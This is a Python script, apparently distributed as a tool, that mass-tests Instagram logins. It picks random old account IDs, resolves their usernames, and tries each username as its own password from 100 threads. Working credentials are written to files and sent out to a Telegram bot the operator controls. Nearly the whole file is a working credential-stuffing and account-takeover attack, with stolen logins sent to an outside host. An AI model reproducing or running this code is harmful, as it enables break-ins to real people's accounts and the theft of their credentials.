import subprocess
import sys
import importlib
import os

def install_with_output(package_name, import_name=None):
    try:
        importlib.import_module(import_name or package_name.replace("-", "_"))
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

required = {
    "requests": "requests",
    "rich": "rich",
    "cfonts": "cfonts",
    "user_agent": "user_agent",
    "colorama": "colorama",
    "asmix": "asmix"
}

for pkg, imp in required.items():
    install_with_output(pkg, imp)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

clear()

from cfonts import render
from colorama import init, Fore, Style

init(autoreset=True)

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')

    print(Fore.RED + '=' * 60)

    banner = render('BAYMAX!', 
                    colors=['cyan', 'yellow'], 
                    align='center',
                    space=False)
    print(banner)

    print(Fore.RED + 'FILE BY @Bayymaxb4601'.center(60))
    print(Fore.RED + '=' * 60)

show_banner()

import requests
import sys

API_VALIDATE_URL = "https://file-expiry.onrender.com/validate"

def validate_user():
    user_id = input("🔑 Enter your USER ID: ").strip()
    code = input("🔒 Enter your ACCESS CODE: ").strip()

    try:
        resp = requests.get(API_VALIDATE_URL, params={"user_id": user_id, "code": code}, timeout=8)
    except requests.RequestException as e:
        print(f"❌ Connection error: {e}")
        sys.exit(1)

    try:
        data = resp.json()
    except ValueError:
        print("❌ Invalid response from server.")
        sys.exit(1)

    if resp.status_code == 200 and data.get("valid"):
        print("✅ Access granted!")
        return True
    else:
        error = data.get("error", "Unknown error")
        print(f"⛔ Access denied: {error}")
        sys.exit(1)

def main():
    print("🚀 Running main script...")
    # 👉 Put your real script logic here
    for i in range(5):
        print(f"Task {i+1} completed!")

if __name__ == "__main__":
    if validate_user():
        main()
        show_banner()

import requests, os, random, time, sys, string, json, threading, webbrowser, base64
from uuid import uuid4
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from cfonts import render
from user_agent import generate_user_agent as uu
from asmix import Instagram
from colorama import Fore, init
init(autoreset=True)

import os, requests
import sys
import time

B="\033[1;30m"; R="\033[1;31m"; G="\033[1;97m"; Y="\033[1;33m"
Bl="\033[1;34m"; P="\033[1;35m"; C="\033[1;34m"; E="\033[1;33m"
J="\033[1;31m"; I="\033[1;32m"; H="\x1b[38;5;208m"; M='\x1b[1;37m'
RESET = "\033[0m"

Con = Console()
uid = str(uuid4())
a = 0
u = 0
z = 0
j = 0
Ex = 0
from cfonts import render                

bot_token = input(f"{Fore.CYAN}[{Fore.YELLOW} ★ {Fore.CYAN}] {Fore.LIGHTWHITE_EX}Token {Fore.RESET}: ")
chat_id   = input(f"{Fore.CYAN}[{Fore.YELLOW} ★ {Fore.CYAN}] {Fore.LIGHTWHITE_EX}Chat ID {Fore.RESET}: ")

def generate_userid(year_choice):
    year_ranges = {
        "1": (100000, 1279000),          
        "2": (100000, 1700000),     
        "3": (1279001, 17750001),   
        "4": (17750001, 47750000)  
    }
    min_id, max_id = year_ranges.get(year_choice, (100000, 50000000))
    return str(random.randrange(min_id, max_id))

print(f"""{Fore.CYAN}[{Fore.YELLOW} ★ {Fore.CYAN}] {Fore.LIGHTWHITE_EX}Select Year Range:
  1) 2010
  2) 2010 - Mar 2011
  3) 2011
  4) 2012
""")

year_choice = input(f"{Fore.CYAN}[{Fore.YELLOW} ★ {Fore.CYAN}] {Fore.LIGHTWHITE_EX}Enter option (1-4) {Fore.RESET}: ")

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {'chat_id': chat_id, 'text': msg}
        requests.post(url, data=payload)
    except Exception as e:
        print(f"ohk ji : {e}")

def check(username, pasw):
    global a, u, z, j
    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'
    }
    data = {
        'uuid': uid,
        'password': pasw,
        'username': username,
        'device_id': uid,
        'from_reg': 'false',
        '_csrftoken': 'missing',
        'login_attempt_countn': '0'
    }

    try:
        rii = requests.post(url, headers=headers, data=data, timeout=15)
        re = rii.text
        print(re)

        if '"logged_in_user"' in re or '"challenge_required"' in re:
            os.system('cls' if os.name == 'nt' else 'clear')
            u += 1
            try:
                resp_json = json.loads(re)
            except:
                pass  

            with open('2010-2012.txt', 'a') as f:
                f.write(f'{username}:{pasw} • @baymaxx\n')

            send_telegram(
                f"🧑‍💻 Le Bhai Krle Bypass!!\n"
                f"User: {username}\n"
                f"Pass: {pasw}\n"
                f"Link: https://instagram.com/{username}\n"
                f"📁 File by @Bayymaxb4601"
            )
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            z += 1
            print(
                f"{C}Hits: {Y}{u} "
                f"{C}// Bad: {Y}{z} "
                f"{C}// Retries: {Y}{j}{RESET}",
                end='\r'
            )

    except Exception as e:
        j += 1
        print(f"[ERROR] check(): {e}")

def Users():
    global Ex
    try:
        LsD = ''.join(random.choices(string.digits, k=4))
        UseriD = generate_userid(year_choice)
        vars = json.dumps({'id': UseriD, 'render_surface': 'PROFILE'})
        resp = requests.post(
            'https://www.instagram.com/api/graphql',
            headers={'X-FB-LSD': LsD},
            data={'lsd': LsD, 'variables': vars, 'doc_id': '25618261841150840'},
            timeout=15
        )
        u = resp.json()['data']['user']['username']
        Ex += 1
        open('2k1012hits.txt', 'a').write(f"{u}:{u}\n")
        check(u, u)
    except:
        pass    

threads = []
for _ in range(100):
    t = threading.Thread(target=lambda: [Users() for _ in range(1000)])
    t.start()
    threads.append(t)
for t in threads:
    t.join()
    

